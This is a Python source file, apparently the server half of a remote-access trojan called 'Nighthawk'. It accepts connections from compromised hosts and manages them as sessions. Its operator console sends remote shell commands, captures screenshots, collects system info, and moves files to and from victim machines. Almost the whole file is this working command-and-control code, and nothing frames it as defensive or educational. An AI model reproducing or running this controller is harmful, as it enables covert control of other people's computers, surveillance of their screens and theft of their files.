import socket
import os 
import threading 
import platform 
import uuid
import requests
from help import *
class my_Server():
    def __init__(self , lhost , lport):
        self.i = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.lhost = lhost
        self.lport = lport
        self.system = platform.system()
        self.sessions = dict()
        self.done = False
        self.done1 = False
    def listen(self):
        try:
            self.i.bind((self.lhost , self.lport))
            self.i.listen()
            print(f'[*] Listening on {self.lhost}:{self.lport} ...')
            while True:
                conn , addr  = self.i.accept()
                self.add_session(conn , addr)
        except Exception as e :
            print(f'Error ==> {e}')
    def add_session(self , conn , addr):
        try:
            hostname = conn.recv(1024).decode()
            if 'GET' in hostname or 'POST' in hostname:
                pass
            else:
                if self.done1 == False:
                    print(f'[+] Get New Connection From ==> {hostname}:{addr[0]}')
                    self.done = True
                else:
                    pass
                self.sessions[hostname] = conn
        except Exception as e:
            print(f'Error => {e}')
    def session_manager(self):
        try:
            while True:
                while self.done:
                    command = input('Nighthawk $>').lower()
                    if command == 'help':
                        pass
                    elif command == 'show':
                        count = 0
                        print(f'Active Sessions : {len(self.sessions)}')
                        for session in self.sessions:
                            count += 1
                            print(f'{count}- {session}')
                    elif command.startswith('connect'):
                        try:
                            data = command.split()
                            hostname = data[1]
                            if hostname in self.sessions:
                                conn = self.sessions[hostname]
                                self.interact_user(conn , hostname)
                            else:
                                print('[x] User Not Found ?!')
                        except:
                             print('[x] User Not Found ?!')
                    elif command == 'my_ip':
                        self.my_ip()
                    elif command == 'clear':
                        if self.system == 'Windows':
                            os.system('cls')
                        else:
                            os.system('clear')
                    else:
                        print('Command Not Found ?!')
        except Exception as e:
            print(f'Error => {e}')
    def interact_user(self ,conn , hostname):
        try:
            while True:
                self.done1 = True
                command = input(f'{hostname} $>')
                if command == 'help':
                    pass
                elif command == 'shell':
                    conn.sendall(command.encode())
                    while True:
                        command = input('SHELL $>').lower()
                        if command != 'exit' and len(command) > 0:
                           conn.sendall(command.encode())
                           while True:
                               output = conn.recv(1024).decode()
                               if output[-5:] == '<end>' or output == '<end>':
                                    if output[-5:] == '<end>':
                                       print(output[:-5])
                                       break
                                    else:
                                        break
                               else:
                                   print(output)
                        elif command == 'exit':
                            conn.sendall(command.encode())
                            break
                        else:
                            pass
                elif command == 'screenshot':
                    conn.sendall(command.encode())
                    uid = uuid.uuid4()
                    with open(f'{uid}.jpg' , 'wb') as file:
                        while True:
                            data = conn.recv(1024)
                            if data[-5:] == b'<end>' or data == b'<end>':
                                if data[-5:] == b'<end>':
                                    file.write(data[:-5])
                                    break
                                else:
                                    break
                            else:
                                file.write(data)
                elif command == 'info':
                    conn.sendall(command.encode())
                    rsp = conn.recv(1024).decode()
                    print(rsp)
                elif command == 'clear':
                        if self.system == 'Windows':
                            os.system('cls')
                        else:
                            os.system('clear')
                elif command.startswith('download'):
                    try:
                        data = command.split()
                        filename = data[1]
                        conn.sendall(command.encode())
                        rsp = conn.recv(1024).decode()
                        if rsp == 'work':
                            with open(f'saved_{filename}' , 'wb') as file:
                                while True:
                                    data = conn.recv(1024)
                                    if data == b'<end>' or data[-5:] == b'<end>':
                                        if data[-5:] == b'<end>':
                                            file.write(data[:-5])
                                            break
                                        else:
                                            break
                                    else:
                                        file.write(data)
                                file.close()
                                print(F'{filename} Downloaded Successfully !')
                        elif rsp == 'error:admin':
                            print('Permission Error !')
                        else:
                            print('File Not Found ?!')
                    except:
                        print('Not Enough Arg !')
                elif command.startswith('upload'):
                    try:
                        data = command.split()
                        filename = data[1]
                        torf = os.path.exists(filename)
                        if torf == False:
                            print('File Not Found ?!')
                        else:
                            conn.sendall(command.encode())
                            rsp = conn.recv(1024).decode()
                            if rsp == 'work':
                                with open(filename , 'rb') as file:
                                    while True:
                                        data = file.read(1024)
                                        if data:
                                            conn.sendall(data)
                                        else:
                                            conn.sendall('<end>'.encode())
                                            break
                                    file.close()
                                print(f'{filename} Successfully Uploaded !')
                            else:
                                print('Permission Error !')
                    except UnicodeError:
                        print('Make sure to place the file in the same folder as the server.')
                elif command == 'exit':
                    break
                else:
                    print('Command Not Found ?!')
        except Exception as e :
            print(f'Error => {e}')
    def my_ip(self):
        r1 = requests.get('http://www.geoplugin.net/json.gp')
        data = r1.json()
        my_ip = data['geoplugin_request']
        print(f'My Ip : {my_ip}')
    def start_server(self):
        server = my_Server(self.lhost , self.lport)
        threading.Thread(target=server.listen).start()
        threading.Thread(target=server.session_manager()).start()


